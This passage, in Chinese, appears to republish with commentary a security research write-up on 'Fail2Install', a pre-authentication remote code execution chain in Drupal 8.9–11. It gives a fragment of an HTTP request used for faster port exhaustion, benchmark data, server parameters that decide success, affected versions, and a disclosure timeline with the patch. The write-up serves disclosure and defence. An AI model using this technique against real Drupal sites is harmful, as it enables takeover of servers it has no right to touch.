X-HTTP-Method-Override: GET  
  
Content-Length: 0  
  
它快的原因有点绕。Drupal 打开常规数据库连接之后，会立刻做一次输入净化检查。当 **X-HTTP-Method-Override**  
 把 POST 请求伪装成 GET 时，Drupal 会判定方法覆盖非法，直接甩回一个空的 HTTP 400，链路到此为止。数据库连接已经建立，业务逻辑却一行都没跑。  
  
这正是我们要的：连接开得够快，收尾也够快。  
  
用这个请求重跑同一套压测，数据好看了不止一点：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibdSoYERRNEks7AfjicRxnJrEibiakib5QJtgke9u9XffT6te4YA8ibnXYFicooUqZgGPWd8BMbibYqNG8WgIpXLFsRMeLIwKpgel6vQrA/640?wx_fmt=png&from=appmsg "")  
  
▲ 单 PDO 连接方案在各 EC2 实例规格上的压测数据  
  
换成 authorize.php 端点后，4 vCPU 的机器就能打出 Cannot assign requested address。门槛直接砍掉一半。  
  
这里有个反直觉的结论值得说清楚：每次请求开两条连接，看起来效率翻倍，实测却输给了"每请求一条连接 + 更快的端点"。瓶颈从来不在每请求挂几个 socket，而在服务器每秒能处理多少个请求。端点快一倍，收益远大于连接数翻倍。这个取舍在渗透工程里挺常见——盯着放大单个动作的收益，往往不如换个更便宜的动作。  
  
源端口耗尽在安装器流程里的位置，大致是这样：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeTNW6iahXy6UvtbgU6rwIjicHibAcorPqlR1Hpmbsn92dRbxqrbDkNIgVRDo1yylpvUuSCYsx7ulOib2EGOlK8xwC4I2NRyBvJV4s/640?wx_fmt=png&from=appmsg "")  
  
▲ PHP-FPM + PostgreSQL/MySQL 环境下的利用链时序  
  
完整的攻击链跑在官方镜像 Drupal（PHP-FPM）+ MySQL 上时，长这样：  
  
  
▲ 标准 Drupal（PHP-FPM + MySQL）安装环境下的完整利用链  
### 局限：能不能跑通每台服务器  
  
快端点的进展不小，问题也随之而来：这套东西能不能在任意服务器上成立？  
  
先明确前提——我们针对的是跑默认配置的 PHP-FPM 副本。pm.max_children = 5 只是默认值，完全可以改。子进程数翻一倍，m7i.large 这类规格就轻松够到所需速率了。默认值是个软约束，不是硬墙。  
  
部署方式也会反向增加难度。三个 PHP-FPM 副本、每个 5 个 worker，负载均衡器会把请求摊到三台上，要打穿单副本的源端口，请求量差不多要乘三。这类场景真正的卡点往往不在应用层，而在上游代理——它未必有能力把这么多请求快速转发过来。代理先成为瓶颈，攻击节奏就散了。  
  
换句话说，这套手法的成功率高度依赖目标的具体形态：默认单副本最容易，多副本加限流代理会让成本上升一个量级。它不是一个通杀的解，更像是把"默认配置"这个前提压榨到极致。  
  
到达错误只是第一步。发往 /core/install.php[41]  
的请求，还得在端口仍然耗尽的时间窗内落到同一个 PHP-FPM（PHP FastCGI 进程管理器）副本上。三副本部署不会让利用彻底失效，但会把竞态窗口切得更碎，赢面下降。  
  
基准测试里有两个数字看着别扭。m7i.large 每秒能处理 471 个以上响应，PHP 到 MySQL 的 TIME_WAIT 套接字却只累积到 17,356 个；t3.small 上的快速路径结果又低得反常。  
  
第一个问题出在 TIME_WAIT 的归属上。不是每个响应都会在 PHP 侧留下 TIME_WAIT 套接字。按 TCP 的规则，先发 FIN 的那一方进入 TIME_WAIT。负载一重，连接关闭的时序就变了，数据库可能抢在 PHP 前面发 FIN，PHP 侧自然不计数。作者用 Drupal 的 /user/logout[42]  
路由测了并发的影响：并发流从 1 加到 5，PHP 侧进入 TIME_WAIT 的比例一路往下掉。  
<table><thead><tr><th><section><span leaf="">并发流数</span></section></th><th><section><span leaf="">PHP 侧进入 TIME_WAIT 的比例</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">1</span></section></td><td><section><span leaf="">99.3%</span></section></td></tr><tr><td><section><span leaf="">2</span></section></td><td><section><span leaf="">99.4%</span></section></td></tr><tr><td><section><span leaf="">3</span></section></td><td><section><span leaf="">93.0%</span></section></td></tr><tr><td><section><span leaf="">4</span></section></td><td><section><span leaf="">84.6%</span></section></td></tr><tr><td><section><span leaf="">5</span></section></td><td><section><span leaf="">75.7%</span></section></td></tr></tbody></table>  
m7i.large 上更快的 authorize.php[43]  
端点平均每秒产生 575.5 个响应，但每秒只新增 250.7 个 PHP 到 MySQL 的 TIME_WAIT 套接字，转化率约 43.6%。照这个比例，要凑出每秒 471 个 PHP 侧 TIME_WAIT 套接字，得把响应速率推到每秒 1,080 次左右。  
  
这说明“响应数”和“可用的源端口占用数”不是一回事。拿响应速率直接估算攻击成本，会低估一个量级。真正要盯的是 PHP 侧 TIME_WAIT 的转化率，它随并发、端点、数据库关闭行为浮动。对攻击者来说，挑一个让 PHP 先关连接的端点，比盲目堆请求更有效。  
  
第二个反常结果是 t3.small 的快速路径反而更低。原因不在端点，而在 tcp_max_tw_buckets[44]  
。测试机上这个值被设成 8,192，它不是 Linux 的通用默认值，而是限制一个网络命名空间里 TIME_WAIT 套接字总量的上限，不管源和目的。  
  
上限一旦触顶，内核会立刻销毁多出来的 TIME_WAIT 条目。NGINX 到 PHP-FPM 的连接和 PHP 到 MySQL 的连接抢的是同一个全局额度。PHP 到 MySQL 的多余条目在 28,232 个数据库连接元组全部占满之前就被丢掉了，SQLSTATE[HY000] [2002] Cannot assign requested address 这个错误因此到不了。  
  
这带来一个反直觉的判断：机器小不等于好打。2 vCPU 的 t3.small 受 tcp_max_tw_buckets 压制，源端口耗尽在摸到数据库连接上限之前就被打断。4 vCPU 的机器上，这条链更完整。作者的说法是 4 vCPU 可远程利用，2 vCPU 更看部署配置。我同意这个分法，但还得补一句：看的不只是 vCPU 数，还要看 tcp_max_tw_buckets、PHP-FPM worker 数、数据库 max_connections，以及前面有没有限流代理。四个参数合起来才决定成功率。  
  
把三处系统级限制串起来，结论就清楚了：看起来只影响可用性的错误，可以变成跨安全边界的原语。Drupal 里一次临时数据库故障，能造出 FAIL、FAIL、SUCCESS 的序列，在已经上线的站点上重开安装器，最后通过一个含 PHP 代码的 SQLite 数据库拿到预认证 RCE（远程代码执行）。  
  
Apache 场景用的是数据库 max_connections 限制。Apache 的 worker 多，更容易压到连接上限，可靠性也更高。Linux 源端口耗尽这条路径同样能配 Apache，但它主要是给 PHP-FPM 用的——默认五个 worker 不足以直接打满数据库连接限制。这个选择很务实：哪种部署先撞到哪个限制，就拿哪个限制开刀。  
  
版本边界也值得看一眼。漏洞影响 Drupal 8.9、9、10、11，不影响 Drupal 7 和 8.9 之前的 8。Drupal 7 验证不了数据库时，只要 settings.php 里有数据库配置[45]  
，仍然会阻止安装。8.9 之前的 8 同样是 fail-closed（失败关闭）：数据库验证失败但存在已存连接信息[46]  
时，立即抛 AlreadyInstalledException。两个版本都把本地配置当作可信信号，临时数据库故障没法重开安装器。修复思路不是消灭数据库错误，而是不让错误改变“已安装”这个判断。这个方向比逐个堵具体路径更稳。  
  
时间线：  
- 2026 年 10 月 27 日：在默认配置的 Apache 加 PostgreSQL 上确认预认证 RCE。  
  
- 2026 年 10 月 28 日：确认 Apache 加 MySQL、PHP-FPM 加 PostgreSQL 或 MySQL 上的本地 RCE 链。  
  
- 2026 年 11 月 2 日至 5 日：对 PHP-FPM 手法做基准测试、优化，并记录其限制。  
  
- 2026 年 11 月 18 日：Drupal 发布 SA-CORE-2026-017[1]  
和补丁版本，对应 commit a15a19b[47]  
。  
  
从时间线看，10 月底确认链，11 月初做基准和优化，11 月 18 日出补丁，节奏不算慢。真正花时间的是把“能打”变成“知道在什么配置下能打”。这类研究值钱的地方也在这里——它给防守方的是一张参数表，不是一个 POC（概念验证）截图。  
  
  
▲ Kevin Gervot，Searchlight Cyber 安全研究员  
  
Kevin Gervot，Searchlight Cyber 安全研究员。联系方式：领英主页[48]  
  
  
▲ Adam Kues，Searchlight Cyber 安全研究员  
  
Adam Kues，Searchlight Cyber 安全研究员。联系方式：领英主页[49]  
### 相关研究  
- **Cache Me If You Can: XSS in Cloudflare's /cdn-cgi/image/**  
（2026 年 10 月 28 日）——/research/cache-me-if-you-can-xss-in-cloudflares-cdn-cgi-image  
  
- **High Fidelity Detection Mechanism for php2shell**  
（CVE-2026-109618 与 CVE-2026-109619，2026 年 10 月 22 日）——/research/high-fidelity-detection-mechanism-for-php2shell-cve-2026-109618-and-cve-2026-109619  
  
- **How practical is 100k requests per second? Introducing h3fuzz**  
（2026 年 10 月 20 日）——/research/how-practical-is-100k-requests-per-second-introducing-h3fuzz  
  
- **More Critical Bugs in Adobe Experience Manager: Pre-Auth RCE**  
（2026 年 10 月 15 日）——/research/more-critical-bugs-in-adobe-experience-manager-pre-auth-rce  
  
- **Leaking the Keys to the Kingdom: How a Single Slip Handed Over a Darknet Empire**  
（2026 年 10 月 8 日）——/research/leaking-the-keys-to-the-kingdom-how-a-single-slip-handed-over-a-darknet-empire  
  
- **A JPEG, a Race, and a Ghost: Breaking Discourse's Image Pipeline**  
（2026 年 10 月 7 日）——/research/a-jpeg-a-race-and-a-ghost-breaking-discourses-image-pipeline  
  
这批题目放在一起看，Searchlight Cyber 的研究口味挺清楚：图像处理管线、请求速率极限、PHP 到 shell 的落地路径。Fail2Install 正好是这三条线的交叉点。  
  
整条链的杀伤力不在单个 bug 的 CVSS 分数，而在它能被塞进 install.php 这个前置认证入口。Drupal 的正确配置本就是"装完删掉 install.php"，可现实里镜像、模板、自动化部署脚本一遍遍把它带回来。防守方要做的不是等下一个补丁，而是先扫一遍自己的资产里还有多少个活着的 install.php。  
### 参考资料  
  
[1]   
https://www.drupal.org/sa-core-2026-017  
  
[2]   
https://github.com/Kludex/uvicorn  
  
[3]   
https://github.com/php/php-src/blob/293002ddeaa29f8452800807c63227925c05edf2/Zend/zend.c#L1341-L1362  
  
[4]   
https://hub.docker.com/_/postgres/tags?name=18.6  
  
[5]   
https://github.com/postgres/postgres/blob/724edf9bde9d356724ad384a2e196edc3c9f80f7/src/backend/utils/misc/postgresql.conf.sample#L65-L67  
  
[6]   
https://hub.docker.com/_/mysql/tags?name=8.4.9  
  
[7]   
https://github.com/mysql/mysql-server/blob/f9c88132a87a7d9e740e50bce2621999695bd3fe/sql/sys_vars.h#L104-L111  
  
[8]   
https://dev.mysql.com/doc/refman/8.4/en/too-many-connections.html  
  
[9]   
https://learn.microsoft.com/en-us/sql/linux/quickstart-install-connect-docker  
  
[10]   
https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-the-user-connections-server-configuration-option  
  
[11]   
https://hub.docker.com/_/php/tags?name=8.5-apache  
  
[12]   
https://github.com/docker-library/php/blob/5ec2a6a0dad498e89a91a39454dbb52e98ce2bdb/8.5/trixie/apache/Dockerfile#L92-L98  
  
[13]   
https://sources.debian.org/src/apache2/2.4.69-1~deb13u1/debian/config-dir/mods-available/mpm_prefork.conf/#L8  
  
[14]   
https://hub.docker.com/_/php/tags?name=8.5-fpm  
  
[15]   
https://github.com/php/php-src/blob/dd6e76cce27aaa0ed9f7520648ed1081dfb6af36/sapi/fpm/www.conf.in#L116-L142  
  
[16]   
https://hub.docker.com/_/httpd/tags?name=2.4.69  
  
[17]   
https://github.com/apache/httpd/blob/1e06e9860794ce39605b79a0a787abfe084e5677/server/mpm/event/event.c#L3679-L3686  
  
[18]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/includes/install.core.inc#L1151-L1161  
  
[19]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/includes/install.core.inc#L1192-L1207  
  
[20]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/lib/Drupal/Core/Database/Install/Tasks.php#L185-L204  
  
[21]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/includes/install.core.inc#L1170-L1187  
  
[22]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/lib/Drupal/Core/Site/Settings.php#L145-L163  
  
[23]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/includes/install.core.inc#L2202-L2218  
  
[24]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/sqlite/src/Driver/Database/sqlite/Install/Tasks.php#L49-L60  
  
[25]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/sqlite/src/Driver/Database/sqlite/Connection.php#L99-L117  
  
[26]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/lib/Drupal/Core/Installer/Form/SiteConfigureForm.php#L244-L251  
  
[27]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/.htaccess#L138-L149  
  
[28]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/system/src/Routing/AssetRoutes.php#L40-L66  
  
[29]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/system/src/Controller/AssetControllerBase.php#L161  
  
[30]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/lib/Drupal/Component/Utility/UrlHelper.php#L103-L113  
  
[31]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/system/src/Controller/AssetControllerBase.php#L167  
  
[32]   
https://hub.docker.com/layers/library/drupal/11.4.11-php8.5-apache  
  
[33]   
https://hub.docker.com/layers/library/postgres/18.6  
  
[34]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/lib/Drupal/Core/Logger/LoggerChannel.php#L100-L119  
  
[35]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/profiles/standard/standard.info.yml#L5-L31  
  
[36]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/dblog/src/Logger/DbLog.php#L64-L104  
  
[37]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/mysql/src/Driver/Database/mysql/Schema.php#L89-L97  
  
[38]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/mysql/src/Driver/Database/mysql/Connection.php#L104-L115  
  
[39]   
https://dev.mysql.com/doc/refman/8.4/en/charset-unicode-utf8mb4.html  
  
[40]   
https://github.com/mysql/mysql-server/blob/f9c88132a87a7d9e740e50bce2621999695bd3fe/share/messages_to_clients.txt#L5407-L5409  
  
[41]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/install.php  
  
[42]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/modules/user/user.routing.yml#L9-L17  
  
[43]   
https://github.com/drupal/drupal/blob/76deda03b09b57d76941e2d30e6dade35e92a14a/core/authorize.php  
  
[44]   
https://github.com/torvalds/linux/blob/adc218676eef25575469234709c2d87185ca223a/Documentation/networking/ip-sysctl.rst?plain=1#L562-L568  
  
[45]   
https://github.com/drupal/drupal/blob/e7242e52bb13286c67d27fad57915f868f50b0a9/includes/install.core.inc#L282-L303  
  
[46]   
https://github.com/drupal/drupal/blob/58153924a828197866f99804f3e5b9ee9a4cc600/core/includes/install.core.inc#L520-L530  
  
[47]   
https://github.com/drupal/drupal/commit/a15a19b74bb9f16f75a44ed39219049283de2381  
  
[48]   
https://www.linkedin.com/in/kevin-gervot/  
  
[49]   
https://www.linkedin.com/in/adam-kues/  
  
[50]   
https://www.slcyber.io/research/fail2install-system-limits-pre-auth-rce-drupal  
  
